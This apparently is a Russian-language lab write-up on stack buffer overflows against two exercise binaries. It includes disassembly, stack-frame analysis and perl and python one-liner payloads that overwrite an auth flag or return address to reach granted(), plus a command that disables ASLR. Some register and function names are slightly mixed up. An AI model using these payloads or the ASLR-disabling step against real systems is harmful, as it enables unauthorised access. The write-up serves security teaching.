perl -e 'print "a"x32 . "\x9d\x84\x04\x08"' | ./vuln
flag(4b), pad(12b), buf(16b), ptr(8b)

Выполняем команду objdump -d auth_overflow > auth_overflow_dump.txt
В получившемся файле нас интересует функция check_authentication:

0000000000400607 <check_authentication>:
  400607:	55                   	push   %rbp
  400608:	48 89 e5             	mov    %rsp,%rbp
  40060b:	48 83 ec 30          	sub    $0x30,%rsp
  40060f:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
  400613:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
  40061a:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  40061e:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  400622:	48 89 d6             	mov    %rdx,%rsi
  400625:	48 89 c7             	mov    %rax,%rdi
  400628:	e8 a3 fe ff ff       	callq  4004d0 <strcpy@plt>
  40062d:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  400631:	48 8d 35 4c 01 00 00 	lea    0x14c(%rip),%rsi        # 400784 <_IO_stdin_used+0x4>
  400638:	48 89 c7             	mov    %rax,%rdi
  40063b:	e8 c0 fe ff ff       	callq  400500 <strcmp@plt>
  400640:	85 c0                	test   %eax,%eax
  400642:	75 07                	jne    40064b <check_authentication+0x44>
  400644:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
  40064b:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  40064f:	48 8d 35 36 01 00 00 	lea    0x136(%rip),%rsi        # 40078c <_IO_stdin_used+0xc>
  400656:	48 89 c7             	mov    %rax,%rdi
  400659:	e8 a2 fe ff ff       	callq  400500 <strcmp@plt>
  40065e:	85 c0                	test   %eax,%eax
  400660:	75 07                	jne    400669 <check_authentication+0x62>
  400662:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
  400669:	8b 45 fc             	mov    -0x4(%rbp),%eax
  40066c:	c9                   	leaveq 
  40066d:	c3                   	retq   

В ходе анализа кода было установлено:
1. На стеке выделяются три переменные в ячейках памяти rbp-4, rbp-0x20 и rbp-0x28.
2. Переменная в ячейке rbp-4 вероятнее всего соответствует переменной auth_flag в исходном коде программы, т.к. перед эпилогом функции ее значение сохраняется в регистре eax, который обычно используется для возврата 32 битных значений.
3. rbp-20h соответствует password_buffer, т.к. перед вызовом функции strcpy ее адрес сохраняется в rdi, который обычно используется для хранения первого аргумента при вызове функции.
4. rbp-28h соответствует password, т.к. ее значение сохраняется в rsi, который обычно используется для хранения первого аргумента при вызове функции. 

Т.к. в тексте функции ни к каким другим ячейкам стека обращение не идет, можно считать, что это все выделенные переменные на стеке.

Таким образом, фрейм этой функции далее rbp к концу ее выполнения выглядит следующим образом (адреса растут снизу вверх):
auth_flag (4 байта)
неизвестно (12 байт)
password_buffer (16 байт)
password (8 байт)
неизвестно (8 байт)

Между переменными auth_flag и password_buffer находится неиспользуемое функцией
место, равное 12 байт. Также 8 байт дополнительно были "выделены" функцией
после переменной password (sub $0x30, $rsp). Наличие этих "пустот" можно
объяснить тем, что после выделения каждой переменной компилятор пытался
выровнять стек по 16 байтам. Инструкции SSE требуют этого, и многие компиляторы
по умолчанию выполняют это требование, даже если SSE не исользуется в
программе.

Итак, для того, чтобы взломать программу, необходимо записать в auth_flag любое
значение, отличное от нуля, и тогда при проверке выберется нужная ветвь. Для
этого достаточно ввести любой пароль длиннее 28 символов, где последний символ
не будет нулевым, т.к. в этом случае по крайней мере один байт auth_flag
перезапишется и его значение станет отличным от нуля. Т.к. strcmp не имеет
проверки на границы, он продолжит перезаписывать ячейки памяти даже после того,
как выйдет за границы массива.

Однако, стоит понимать, что если "переборщить" и перезаписать слишком много, то
strcpy перезапишет базовый указатель вызвавшей эту функцию функции и адрес
возврата, а этого достаточно, чтобы программа прекратила свое выполнение с
ошибкой.

Следует учесть, что буфер password помимо введенного пользователем пароля также
хранит нулевой символ, а функция strcpy копирует в выходной буфер строку вместе
с этим символом. Таким образом, strcpy перезаписывает на 1 байт больше
количества введенных пользователем символов.

Учитывая все вышеуказанные особенности, для взлома пароля вход должен
составлять от 29 до 31 символов, при этом последовательность не должна включать
нулевой символ.

python -c 'print "a"*24 + "\xa7\x05\x40"' | ./auth_overflow2

Выполняем аналогичную команду для auth_overflow2:
objdump -d auth_overflow2 > auth_overflow2_dump.txt
Нас интересует листинг функции check_authentication:
00000000004005d2 <check_authentication>:
  4005d2:	55                   	push   %rbp
  4005d3:	48 89 e5             	mov    %rsp,%rbp
  4005d6:	48 83 ec 10          	sub    $0x10,%rsp
  4005da:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
  4005de:	48 89 c6             	mov    %rax,%rsi
  4005e1:	48 8d 3d 6b 01 00 00 	lea    0x16b(%rip),%rdi        # 400753 <_IO_stdin_used+0x53>
  4005e8:	b8 00 00 00 00       	mov    $0x0,%eax
  4005ed:	e8 be fe ff ff       	callq  4004b0 <__isoc99_scanf@plt>
  4005f2:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
  4005f6:	48 8d 35 59 01 00 00 	lea    0x159(%rip),%rsi        # 400756 <_IO_stdin_used+0x56>
  4005fd:	48 89 c7             	mov    %rax,%rdi
  400600:	e8 9b fe ff ff       	callq  4004a0 <strcmp@plt>
  400605:	85 c0                	test   %eax,%eax
  400607:	75 07                	jne    400610 <check_authentication+0x3e>
  400609:	b8 01 00 00 00       	mov    $0x1,%eax
  40060e:	eb 23                	jmp    400633 <check_authentication+0x61>
  400610:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
  400614:	48 8d 35 43 01 00 00 	lea    0x143(%rip),%rsi        # 40075e <_IO_stdin_used+0x5e>
  40061b:	48 89 c7             	mov    %rax,%rdi
  40061e:	e8 7d fe ff ff       	callq  4004a0 <strcmp@plt>
  400623:	85 c0                	test   %eax,%eax
  400625:	75 07                	jne    40062e <check_authentication+0x5c>
  400627:	b8 01 00 00 00       	mov    $0x1,%eax
  40062c:	eb 05                	jmp    400633 <check_authentication+0x61>
  40062e:	b8 00 00 00 00       	mov    $0x0,%eax
  400633:	c9                   	leaveq 
  400634:	c3                   	retq   

Также нас интересует адрес функции granted:
00000000004005a7 <granted>

На стеке выделяется одна переменная в ячейке rbp-0x10. Она соответствует
переменной password_buffer, т.к. ее адрес загружается в rsi перед вызовом
scanf, т.е. в качестве второго аргумента scanf, как и в исходном коде. Т.к. это
единственная переменная на стеке (sub $0x10, %rsp), фрейм функции
check_authentication выглядит следующим образом:
адрес возврата (8 байт)
базовый указатель вызвавшей функции (8 байт)
password_buffer (16 байт)


Взломать программу можно переписав адрес возврата, т.к. scanf как и strcpy не
проверяет на границы. Входные данные должны строиться следующим образом: любые
символы в количестве 24 штук + адрес функции granted. Т.к. x86 является
little-endian архитектурой, байты нужно записать в обратном порядке, т.е. :
a7 05 40 00 00 00 00 00

Также необходимо учесть, что ОС при загрузке программы производит рандомизацию
адресов (ASLR). В linux отключить ее можно с помощью команды echo 0 | sudo tee
/proc/sys/kernel/randomize_va_space (если система использует sudo и bash), либо
скомпилировав бинарный файл с флагом -no-pie в gcc. Однако предоставленный
бинарный файл был взломан без отключения ASLR в системе (arch linux), вероятно
потому, что при его компиляции был использован флаг -no-pie. Получившаяся
команда:

perl -e 'print "a"x24 . "\xa7\x05\x40" . "\x00"x5' | ./auth_overflow2

Выход:

-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
Segmentation fault (core dumped)
